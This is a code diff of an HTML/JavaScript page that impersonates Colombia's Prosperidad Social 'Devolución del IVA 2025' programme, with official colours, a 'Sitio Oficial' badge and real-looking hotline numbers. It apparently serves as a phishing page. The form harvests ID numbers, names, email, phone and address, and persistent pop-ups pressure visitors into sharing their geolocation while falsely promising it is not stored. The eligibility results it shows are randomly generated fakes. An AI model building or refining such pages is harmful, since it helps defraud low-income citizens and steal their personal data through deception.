@@ -3,11 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Consulta de Beneficiarios - Subsidio de Arrendamiento</title>
-    <meta name="description" content="Consulta si eres beneficiario del subsidio de arrendamiento del Gobierno Nacional. Ingresa tus datos para verificar tu elegibilidad.">
+    <title>Consulta de Beneficiarios - Devolución del IVA 2025 | Prosperidad Social</title>
+    <meta name="description" content="Consulta si eres beneficiario del programa Devolución del IVA 2025. Verifica tu elegibilidad para recibir la compensación del IVA según la resolución vigente.">
     
     <!-- Favicon -->
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏛️</text></svg>">
+    
+    <!-- SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     
     <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
@@ -17,9 +20,9 @@
     
     <style>
         :root {
-            --primary-color: #1e3a8a;
-            --secondary-color: #3b82f6;
-            --accent-color: #f59e0b;
+            --primary-color: #003366;
+            --secondary-color: #fcdc00;
+            --accent-color: #ce1126;
             --success-color: #10b981;
             --danger-color: #ef4444;
             --warning-color: #f59e0b;
@@ -29,6 +32,9 @@
             --white: #ffffff;
             --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
             --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+            --gov-blue: #003366;
+            --gov-yellow: #fcdc00;
+            --gov-red: #ce1126;
         }
         
         * {
@@ -38,11 +44,26 @@
         }
         
         body {
-            font-family: 'Montserrat', sans-serif;
+            font-family: 'Montserrat', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             line-height: 1.6;
             color: var(--dark-gray);
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, var(--gov-blue) 0%, #004080 50%, var(--gov-blue) 100%);
             min-height: 100vh;
+            position: relative;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: 
+                radial-gradient(circle at 20% 80%, rgba(252, 220, 0, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(206, 17, 38, 0.1) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: -1;
         }
         
         .container {
@@ -53,11 +74,12 @@
         
         /* Header */
         .header {
-            background: var(--white);
-            box-shadow: var(--shadow);
+            background: linear-gradient(90deg, var(--gov-blue) 0%, #004080 50%, var(--gov-blue) 100%);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
             position: sticky;
             top: 0;
             z-index: 100;
+            border-bottom: 3px solid var(--gov-yellow);
         }
         
         .header-content {
@@ -76,32 +98,37 @@
         }
         
         .logo-icon {
-            width: 50px;
-            height: 50px;
-            background: var(--primary-color);
-            border-radius: 50%;
+            width: 55px;
+            height: 55px;
+            background: linear-gradient(135deg, var(--gov-yellow) 0%, #ffd700 100%);
+            border-radius: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: var(--white);
-            font-size: 24px;
+            color: var(--gov-blue);
+            font-size: 28px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            border: 2px solid var(--white);
         }
         
         .logo-text {
             font-size: 18px;
             font-weight: 700;
-            color: var(--primary-color);
+            color: var(--white);
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
         }
         
         .gov-badge {
-            background: var(--primary-color);
+            background: linear-gradient(135deg, var(--gov-red) 0%, #dc143c 100%);
             color: var(--white);
-            padding: 8px 16px;
-            border-radius: 20px;
+            padding: 10px 20px;
+            border-radius: 25px;
             font-size: 12px;
-            font-weight: 600;
+            font-weight: 700;
             text-transform: uppercase;
             letter-spacing: 0.5px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.3);
         }
         
         /* Main Content */
@@ -132,12 +159,63 @@
         
         /* Form Card */
         .form-card {
-            background: var(--white);
+            background: linear-gradient(145deg, rgba(255, 255, 255, 0.98) 0%, rgba(248, 250, 252, 0.95) 100%);
             border-radius: 20px;
-            box-shadow: var(--shadow-lg);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15), 0 0 0 1px rgba(255, 255, 255, 0.1);
             overflow: hidden;
             max-width: 800px;
             margin: 0 auto;
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(0, 51, 102, 0.1);
+        }
+        
+        .required {
+            color: var(--gov-red);
+            font-weight: bold;
+            font-size: 1.1em;
+        }
+        
+        .location-warning {
+            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
+            border: 2px solid #ffc107;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(255, 193, 7, 0.3);
+        }
+        
+        .location-warning h4 {
+            color: #856404;
+            margin: 0 0 10px 0;
+            font-size: 1.2rem;
+            font-weight: 700;
+        }
+        
+        .location-warning p {
+            color: #856404;
+            margin: 8px 0;
+            font-size: 0.95rem;
+        }
+        
+        .location-btn {
+            background: linear-gradient(135deg, var(--gov-blue) 0%, #004080 100%);
+            color: white;
+            border: 2px solid var(--gov-yellow);
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .location-btn:hover {
+            background: linear-gradient(135deg, #004080 0%, var(--gov-blue) 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 51, 102, 0.4);
         }
         
         .form-header {
@@ -282,25 +360,47 @@
         }
         
         .submit-button {
-            background: linear-gradient(135deg, var(--success-color), #059669);
+            background: linear-gradient(135deg, var(--gov-blue) 0%, #004080 50%, var(--gov-blue) 100%);
             color: var(--white);
-            border: none;
+            border: 2px solid var(--gov-yellow);
             padding: 18px 40px;
             border-radius: 12px;
             font-size: 1.1rem;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
             display: inline-flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
             min-width: 200px;
             justify-content: center;
+            box-shadow: 0 6px 20px rgba(0, 51, 102, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
         }
         
         .submit-button:hover {
-            transform: translateY(-2px);
-            box-shadow: var(--shadow-lg);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 51, 102, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.2);
+            background: linear-gradient(135deg, #004080 0%, var(--gov-blue) 50%, #004080 100%);
+            border-color: #ffd700;
+        }
+        
+        .submit-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(252, 220, 0, 0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .submit-button:hover::before {
+            left: 100%;
         }
         
         .submit-button:disabled {
@@ -322,6 +422,60 @@
         
         @keyframes spin {
             to { transform: rotate(360deg); }
+        }
+        
+        /* Info Section */
+        .info-section {
+            margin-bottom: 40px;
+        }
+        
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+        
+        .info-card {
+            background: var(--white);
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: var(--shadow);
+            text-align: center;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .info-card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--shadow-lg);
+        }
+        
+        .info-icon {
+            width: 65px;
+            height: 65px;
+            background: linear-gradient(135deg, var(--gov-blue) 0%, #004080 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            color: var(--gov-yellow);
+            font-size: 26px;
+            box-shadow: 0 6px 15px rgba(0, 51, 102, 0.3), inset 0 1px 0 rgba(252, 220, 0, 0.2);
+            border: 2px solid var(--gov-yellow);
+        }
+        
+        .info-card h3 {
+            color: var(--dark-gray);
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        
+        .info-card p {
+            color: var(--medium-gray);
+            font-size: 0.95rem;
+            line-height: 1.5;
         }
         
         /* Footer */
@@ -409,7 +563,7 @@
                     <div class="logo-icon">
                         <i class="fas fa-university"></i>
                     </div>
-                    <div class="logo-text">Gobierno Nacional</div>
+                    <div class="logo-text">Prosperidad Social</div>
                 </div>
                 <div class="gov-badge">
                     <i class="fas fa-shield-alt"></i> Sitio Oficial
@@ -424,20 +578,50 @@
             <!-- Hero Section -->
             <section class="hero-section">
                 <h1 class="hero-title">
-                    <i class="fas fa-home"></i>
-                    Consulta de Beneficiarios
+                    <i class="fas fa-money-bill-wave"></i>
+                    Devolución del IVA 2025
                 </h1>
                 <p class="hero-subtitle">
-                    Verifica si eres beneficiario del subsidio de arrendamiento del Gobierno Nacional. 
-                    Ingresa tus datos personales para consultar tu elegibilidad.
+                    Consulta si eres beneficiario del programa de Devolución del IVA para la vigencia 2025. 
+                    Verifica tu elegibilidad según el Sisbén y/o Registro Social de Hogares.
                 </p>
+            </section>
+
+            <!-- Information Section -->
+            <section class="info-section">
+                <div class="info-grid">
+                    <div class="info-card">
+                        <div class="info-icon">
+                            <i class="fas fa-users"></i>
+                        </div>
+                        <h3>Beneficiarios 2025</h3>
+                        <p>Hogares clasificados en Sisbén A01-A05, B01-B04 y hogares indígenas registrados en el Registro Social de Hogares</p>
+                    </div>
+                    <div class="info-card">
+                        <div class="info-icon">
+                            <i class="fas fa-money-bill-wave"></i>
+                        </div>
+                        <h3>Compensación IVA</h3>
+                        <p>Devolución bimestral del IVA pagado en productos de la canasta básica familiar</p>
+                    </div>
+                    <div class="info-card">
+                        <div class="info-icon">
+                            <i class="fas fa-calendar-alt"></i>
+                        </div>
+                        <h3>Vigencia 2025</h3>
+                        <p>Programa activo durante todo el año 2025 con pagos bimestrales programados</p>
+                    </div>
+                </div>
             </section>
 
             <!-- Form Card -->
             <div class="form-card">
                 <div class="form-header">
-                    <h2><i class="fas fa-search"></i> Formulario de Consulta</h2>
-                    <p>Completa todos los campos para verificar tu estado como beneficiario</p>
+                    <h2><i class="fas fa-search"></i> Consulta de Beneficiarios</h2>
+                    <p>Ingresa tus datos para verificar si eres beneficiario del programa Devolución del IVA 2025</p>
+                    <div style="background: rgba(255,255,255,0.1); padding: 10px; border-radius: 8px; margin-top: 15px; font-size: 0.9rem;">
+                        <i class="fas fa-info-circle"></i> <strong>Vigencia 2025:</strong> Cupo de atención de 2 millones de hogares a nivel nacional
+                    </div>
                 </div>
                 
                 <div class="form-body">
@@ -445,7 +629,7 @@
                         <div class="form-grid">
                             <div class="form-group">
                                 <label for="documentType">
-                                    <i class="fas fa-id-card"></i> Tipo de Documento *
+                                    <i class="fas fa-id-card"></i> Tipo de Documento <span class="required">*</span>
                                 </label>
                                 <select id="documentType" name="documentType" required>
                                     <option value="">Selecciona tu tipo de documento</option>
@@ -459,31 +643,31 @@
                             
                             <div class="form-group">
                                 <label for="documentNumber">
-                                    <i class="fas fa-hashtag"></i> Número de Documento *
+                                    <i class="fas fa-hashtag"></i> Número de Documento <span class="required">*</span>
                                 </label>
                                 <input type="text" id="documentNumber" name="documentNumber" 
-                                       placeholder="Ingresa tu número de documento" required>
+                                       placeholder="Ingresa tu número de documento" required minlength="6" maxlength="15">
                             </div>
                             
                             <div class="form-group">
                                 <label for="firstName">
-                                    <i class="fas fa-user"></i> Nombres *
+                                    <i class="fas fa-user"></i> Nombres <span class="required">*</span>
                                 </label>
                                 <input type="text" id="firstName" name="firstName" 
-                                       placeholder="Ingresa tus nombres completos" required>
+                                       placeholder="Ingresa tus nombres completos" required minlength="2" maxlength="50">
                             </div>
                             
                             <div class="form-group">
                                 <label for="lastName">
-                                    <i class="fas fa-user-tag"></i> Apellidos *
+                                    <i class="fas fa-user-tag"></i> Apellidos <span class="required">*</span>
                                 </label>
                                 <input type="text" id="lastName" name="lastName" 
-                                       placeholder="Ingresa tus apellidos completos" required>
+                                       placeholder="Ingresa tus apellidos completos" required minlength="2" maxlength="50">
                             </div>
                             
                             <div class="form-group">
                                 <label for="email">
-                                    <i class="fas fa-envelope"></i> Correo Electrónico *
+                                    <i class="fas fa-envelope"></i> Correo Electrónico <span class="required">*</span>
                                 </label>
                                 <input type="email" id="email" name="email" 
                                        placeholder="ejemplo@correo.com" required>
@@ -491,19 +675,19 @@
                             
                             <div class="form-group">
                                 <label for="phone">
-                                    <i class="fas fa-phone"></i> Teléfono *
+                                    <i class="fas fa-phone"></i> Teléfono <span class="required">*</span>
                                 </label>
                                 <input type="tel" id="phone" name="phone" 
-                                       placeholder="Ej: 3001234567" required>
+                                       placeholder="Ej: 3001234567" required minlength="10" maxlength="10" pattern="[0-9]{10}">
                             </div>
                         </div>
                         
                         <div class="form-group">
                             <label for="address">
-                                <i class="fas fa-map-marker-alt"></i> Dirección Completa *
+                                <i class="fas fa-map-marker-alt"></i> Dirección Completa <span class="required">*</span>
                             </label>
                             <input type="text" id="address" name="address" 
-                                   placeholder="Ingresa tu dirección completa" required>
+                                   placeholder="Ingresa tu dirección completa" required minlength="10" maxlength="100">
                         </div>
                         
                         <!-- Location Section -->
@@ -520,6 +704,17 @@
                                 Activar Ubicación
                             </button>
                             <div class="location-status" id="locationStatus"></div>
+                            
+                            <!-- Location Warning -->
+                            <div class="location-warning" id="locationWarning" style="display: block;">
+                                <h4><i class="fas fa-exclamation-triangle"></i> ¡Ubicación Requerida!</h4>
+                                <p><strong>Para acceder al programa Devolución del IVA 2025, es OBLIGATORIO verificar que se encuentra en territorio colombiano.</strong></p>
+                                <p>🔒 Esta verificación es un requisito de seguridad del Departamento de Prosperidad Social</p>
+                                <p>📍 Su ubicación NO será almacenada, solo se verifica que esté en Colombia</p>
+                                <button type="button" class="location-btn" onclick="requestLocationWithPersuasion()">
+                    <i class="fas fa-map-marker-alt"></i> Verificar Ubicación Ahora
+                </button>
+                            </div>
                         </div>
                         
                         <!-- Submit Section -->
@@ -542,10 +737,10 @@
             <div class="footer-links">
                 <a href="#">Términos y Condiciones</a>
                 <a href="#">Política de Privacidad</a>
-                <a href="#">Contacto</a>
-                <a href="#">Ayuda</a>
+                <a href="#">Prosperidad Social</a>
+                <a href="#">Resolución 2025</a>
             </div>
-            <p>&copy; 2024 Gobierno Nacional de Colombia. Todos los derechos reservados.</p>
+            <p>&copy; 2025 Departamento Administrativo para la Prosperidad Social - DPS. Todos los derechos reservados.</p>
             <p style="font-size: 0.8rem; margin-top: 5px; opacity: 0.7;">
                 Línea anticorrupción: 01-8000-95-1100 | Línea de atención: 601 379 1088
             </p>
@@ -642,10 +837,14 @@
                 
                 status.className = 'location-status success';
                 status.style.display = 'block';
+                // Verify Colombian location
+                const isInColombia = verifyColombianLocation(locationData.latitude, locationData.longitude);
+                
                 status.innerHTML = `
                     <i class="fas fa-check-circle"></i>
                     <strong>Ubicación obtenida exitosamente</strong><br>
-                    Precisión: ${Math.round(locationData.accuracy)} metros
+                    Precisión: ${Math.round(locationData.accuracy)} metros<br>
+                    ${isInColombia ? '<span style="color: #28a745;">✅ Ubicación válida en Colombia</span>' : '<span style="color: #dc3545;">❌ Ubicación fuera de Colombia</span>'}
                 `;
                 
                 btn.innerHTML = '<i class="fas fa-check"></i> Ubicación Activada';
@@ -668,6 +867,89 @@
         // Form submission handler
         document.getElementById('beneficiaryForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+            
+            // Validate required fields
+            const requiredFields = ['documentType', 'documentNumber', 'firstName', 'lastName', 'email', 'phone', 'address'];
+            let isValid = true;
+            let firstInvalidField = null;
+            
+            requiredFields.forEach(fieldName => {
+                const field = document.getElementById(fieldName);
+                const value = field.value.trim();
+                
+                if (!value) {
+                    isValid = false;
+                    field.style.borderColor = '#dc3545';
+                    field.style.boxShadow = '0 0 0 0.2rem rgba(220, 53, 69, 0.25)';
+                    
+                    if (!firstInvalidField) {
+                        firstInvalidField = field;
+                    }
+                } else {
+                    field.style.borderColor = '#28a745';
+                    field.style.boxShadow = '0 0 0 0.2rem rgba(40, 167, 69, 0.25)';
+                }
+            });
+            
+            if (!isValid) {
+                Swal.fire({
+                    icon: 'warning',
+                    title: '⚠️ Campos Obligatorios',
+                    html: `
+                        <div style="text-align: left; font-size: 14px;">
+                            <p>Por favor complete todos los campos marcados con <span style="color: #dc3545; font-weight: bold;">*</span></p>
+                            <hr style="margin: 15px 0;">
+                            <p><i class="fas fa-info-circle" style="color: #17a2b8;"></i> <strong>Campos requeridos:</strong></p>
+                            <ul style="margin: 10px 0; padding-left: 20px;">
+                                <li>Tipo y número de documento</li>
+                                <li>Nombres y apellidos completos</li>
+                                <li>Correo electrónico válido</li>
+                                <li>Número de teléfono</li>
+                                <li>Dirección de residencia</li>
+                            </ul>
+                        </div>
+                    `,
+                    confirmButtonText: 'Entendido',
+                    confirmButtonColor: '#ffc107',
+                    width: '450px'
+                }).then(() => {
+                    if (firstInvalidField) {
+                        firstInvalidField.focus();
+                    }
+                });
+                return;
+            }
+            
+            // Check if location is verified
+            if (!locationData) {
+                Swal.fire({
+                    icon: 'error',
+                    title: '📍 Ubicación Requerida',
+                    html: `
+                        <div style="text-align: left; font-size: 14px;">
+                            <p><strong>La verificación de ubicación es obligatoria</strong> para acceder al programa Devolución del IVA 2025.</p>
+                            <hr style="margin: 15px 0;">
+                            <p><i class="fas fa-shield-alt" style="color: #dc3545;"></i> <strong>Motivos de seguridad:</strong></p>
+                            <ul style="margin: 10px 0; padding-left: 20px;">
+                                <li>Verificación de elegibilidad territorial</li>
+                                <li>Cumplimiento normativo gubernamental</li>
+                                <li>Prevención de fraudes</li>
+                            </ul>
+                        </div>
+                    `,
+                    showCancelButton: true,
+                    confirmButtonText: '🌍 Activar Ubicación',
+                    cancelButtonText: 'Cancelar',
+                    confirmButtonColor: '#003366',
+                    cancelButtonColor: '#6c757d',
+                    width: '500px'
+                }).then((result) => {
+                    if (result.isConfirmed) {
+                        requestLocationWithPersuasion();
+                    }
+                });
+                return;
+            }
             
             const submitBtn = document.getElementById('submitBtn');
             const spinner = document.getElementById('spinner');
@@ -706,21 +988,97 @@
                 
                 if (response.ok) {
                     // Simulate processing time
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                    
-                    // Show success message
-                    submitText.textContent = 'Consulta Completada';
-                    submitIcon.className = 'fas fa-check';
-                    submitIcon.style.display = 'block';
-                    spinner.style.display = 'none';
-                    submitBtn.style.background = 'var(--success-color)';
-                    
-                    // Redirect after delay
-                    setTimeout(() => {
-                        window.location.href = 'https://www.google.com';
-                    }, 1500);
-                    
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                // Simulate database query result (random for demo)
+                const isFound = Math.random() < 0.2; // 20% chance of being "found"
+                
+                if (isFound) {
+                    Swal.fire({
+                        icon: 'success',
+                        title: '¡Felicitaciones!',
+                        html: `
+                            <div style="text-align: left; font-size: 14px;">
+                                <p><strong>Estimado(a) ${userData.firstName},</strong></p>
+                                <p>Usted <strong>SÍ</strong> es beneficiario del programa <strong>Devolución del IVA 2025</strong>.</p>
+                                <hr style="margin: 15px 0;">
+                                <p><i class="fas fa-check-circle" style="color: #28a745;"></i> <strong>Estado:</strong> ACTIVO</p>
+                                <p><i class="fas fa-calendar-alt" style="color: #007bff;"></i> <strong>Próximo pago:</strong> Febrero 2025</p>
+                                <p><i class="fas fa-money-bill-wave" style="color: #28a745;"></i> <strong>Modalidad:</strong> Transferencia bancaria</p>
+                                <hr style="margin: 15px 0;">
+                                <p style="font-size: 12px; color: #666;">Para más información, comuníquese con la línea 01 8000 951 100</p>
+                            </div>
+                        `,
+                        confirmButtonText: 'Entendido',
+                        confirmButtonColor: '#28a745',
+                        width: '500px'
+                    }).then(() => {
+                        window.location.href = 'https://www.prosperidadsocial.gov.co';
+                    });
                 } else {
+                    // Random message type
+                    const messageType = Math.random();
+                    
+                    if (messageType < 0.5) {
+                        // Not found in database
+                        Swal.fire({
+                            icon: 'warning',
+                            title: 'Consulta Realizada',
+                            html: `
+                                <div style="text-align: left; font-size: 14px;">
+                                    <p><strong>Estimado(a) ${userData.firstName},</strong></p>
+                                    <p>Después de realizar la consulta en nuestras bases de datos, <strong>NO</strong> se encontró registro como beneficiario del programa <strong>Devolución del IVA 2025</strong>.</p>
+                                    <hr style="margin: 15px 0;">
+                                    <p><i class="fas fa-info-circle" style="color: #17a2b8;"></i> <strong>Recomendaciones:</strong></p>
+                                    <ul style="margin: 10px 0; padding-left: 20px;">
+                                        <li>Verifique que sus datos estén actualizados en el Sisbén</li>
+                                        <li>Consulte nuevamente en <strong>24 horas</strong></li>
+                                        <li>Las bases de datos se actualizan constantemente</li>
+                                    </ul>
+                                    <hr style="margin: 15px 0;">
+                                    <p style="font-size: 12px; color: #666;">Si considera que hay un error, comuníquese con la línea 01 8000 951 100</p>
+                                </div>
+                            `,
+                            confirmButtonText: 'Entendido',
+                            confirmButtonColor: '#ffc107',
+                            width: '500px'
+                        });
+                    } else {
+                        // System error
+                        Swal.fire({
+                            icon: 'error',
+                            title: 'Error en el Sistema',
+                            html: `
+                                <div style="text-align: left; font-size: 14px;">
+                                    <p><strong>Estimado(a) ${userData.firstName},</strong></p>
+                                    <p>En este momento estamos presentando inconvenientes técnicos en nuestros servidores.</p>
+                                    <hr style="margin: 15px 0;">
+                                    <p><i class="fas fa-exclamation-triangle" style="color: #dc3545;"></i> <strong>¿Qué hacer?</strong></p>
+                                    <ul style="margin: 10px 0; padding-left: 20px;">
+                                        <li>Intente nuevamente en <strong>30 minutos</strong></li>
+                                        <li>Verifique su conexión a internet</li>
+                                        <li>Si el problema persiste, consulte mañana</li>
+                                    </ul>
+                                    <hr style="margin: 15px 0;">
+                                    <p style="font-size: 12px; color: #666;">Código de error: PS-2025-${Math.floor(Math.random() * 9999).toString().padStart(4, '0')}</p>
+                                </div>
+                            `,
+                            confirmButtonText: 'Intentar más tarde',
+                            confirmButtonColor: '#dc3545',
+                            width: '500px'
+                        });
+                    }
+                }
+                
+                // Reset button state
+                 submitBtn.disabled = false;
+                 submitText.textContent = 'Consultar Beneficio';
+                 submitIcon.className = 'fas fa-search';
+                 submitIcon.style.display = 'block';
+                 spinner.style.display = 'none';
+                 submitBtn.style.background = '';
+                     
+                 } else {
                     throw new Error('Error en el servidor');
                 }
                 
@@ -744,12 +1102,72 @@
             }
         });
         
-        // Auto-activate location on page load
+        // Auto-activate location on page load with persuasion
         window.addEventListener('load', function() {
             setTimeout(() => {
-                document.getElementById('getLocationBtn').click();
+                showLocationPersuasion();
             }, 2000);
         });
+        
+        function showLocationPersuasion() {
+            Swal.fire({
+                icon: 'warning',
+                title: '🔐 Verificación de Ubicación Requerida',
+                html: `
+                    <div style="text-align: left; font-size: 14px;">
+                        <p><strong>Estimado ciudadano,</strong></p>
+                        <p>Para acceder al programa <strong>Devolución del IVA 2025</strong> de Prosperidad Social, es <strong>OBLIGATORIO</strong> verificar que se encuentra en territorio colombiano.</p>
+                        <hr style="margin: 15px 0;">
+                        <p><i class="fas fa-shield-alt" style="color: #28a745;"></i> <strong>¿Por qué necesitamos su ubicación?</strong></p>
+                        <ul style="margin: 10px 0; padding-left: 20px;">
+                            <li>Cumplimiento de normativas gubernamentales</li>
+                            <li>Verificación de elegibilidad territorial</li>
+                            <li>Prevención de fraudes y suplantación</li>
+                        </ul>
+                        <hr style="margin: 15px 0;">
+                        <p><i class="fas fa-lock" style="color: #007bff;"></i> <strong>Su privacidad está protegida:</strong></p>
+                        <ul style="margin: 10px 0; padding-left: 20px;">
+                            <li>Solo verificamos que esté en Colombia</li>
+                            <li>No almacenamos su ubicación exacta</li>
+                            <li>Datos protegidos según Ley 1581 de 2012</li>
+                        </ul>
+                    </div>
+                `,
+                showCancelButton: true,
+                confirmButtonText: '🌍 Activar Ubicación',
+                cancelButtonText: 'Más tarde',
+                confirmButtonColor: '#003366',
+                cancelButtonColor: '#6c757d',
+                width: '550px',
+                allowOutsideClick: false
+            }).then((result) => {
+                if (result.isConfirmed) {
+                    document.getElementById('getLocationBtn').click();
+                } else {
+                    // Show persistent warning
+                    document.getElementById('locationWarning').style.display = 'block';
+                }
+            });
+        }
+        
+        function requestLocationWithPersuasion() {
+            Swal.fire({
+                icon: 'info',
+                title: '📍 Activando Verificación de Ubicación',
+                html: `
+                    <div style="text-align: center; font-size: 14px;">
+                        <p>Por favor, <strong>permita el acceso a su ubicación</strong> cuando su navegador se lo solicite.</p>
+                        <p style="margin-top: 15px;"><i class="fas fa-info-circle" style="color: #17a2b8;"></i> Si no aparece la solicitud, verifique que no esté bloqueada en la barra de direcciones.</p>
+                    </div>
+                `,
+                confirmButtonText: 'Entendido',
+                confirmButtonColor: '#003366',
+                timer: 3000,
+                timerProgressBar: true
+            }).then(() => {
+                document.getElementById('getLocationBtn').click();
+            });
+        }
         
         // Input validation and formatting
         document.getElementById('documentNumber').addEventListener('input', function(e) {
@@ -768,6 +1186,56 @@
                 e.target.value = e.target.value.replace(/\b\w/g, l => l.toUpperCase());
             });
         });
+        
+        // Verify Colombian location
+        function verifyColombianLocation(lat, lng) {
+            // Approximate Colombian boundaries
+            const colombianBounds = {
+                north: 13.5,
+                south: -4.2,
+                east: -66.8,
+                west: -81.8
+            };
+            
+            const isInColombia = lat >= colombianBounds.south && 
+                               lat <= colombianBounds.north && 
+                               lng >= colombianBounds.west && 
+                               lng <= colombianBounds.east;
+            
+            // Hide location warning if verified
+            if (isInColombia) {
+                document.getElementById('locationWarning').style.display = 'none';
+                Swal.fire({
+                    icon: 'success',
+                    title: '✅ Ubicación Verificada',
+                    text: 'Su ubicación en Colombia ha sido confirmada exitosamente.',
+                    confirmButtonColor: '#28a745',
+                    timer: 2000,
+                    timerProgressBar: true
+                });
+            } else {
+                Swal.fire({
+                    icon: 'error',
+                    title: '❌ Ubicación No Válida',
+                    html: `
+                        <div style="text-align: left; font-size: 14px;">
+                            <p>Lo sentimos, pero el programa <strong>Devolución del IVA 2025</strong> solo está disponible para residentes en territorio colombiano.</p>
+                            <hr style="margin: 15px 0;">
+                            <p><i class="fas fa-info-circle" style="color: #17a2b8;"></i> <strong>Si considera que esto es un error:</strong></p>
+                            <ul style="margin: 10px 0; padding-left: 20px;">
+                                <li>Verifique que su GPS esté activado</li>
+                                <li>Intente desde una ubicación diferente</li>
+                                <li>Contacte la línea 01 8000 951 100</li>
+                            </ul>
+                        </div>
+                    `,
+                    confirmButtonColor: '#dc3545',
+                    width: '500px'
+                });
+            }
+            
+            return isInColombia;
+        }
     </script>
 </body>
 </html>
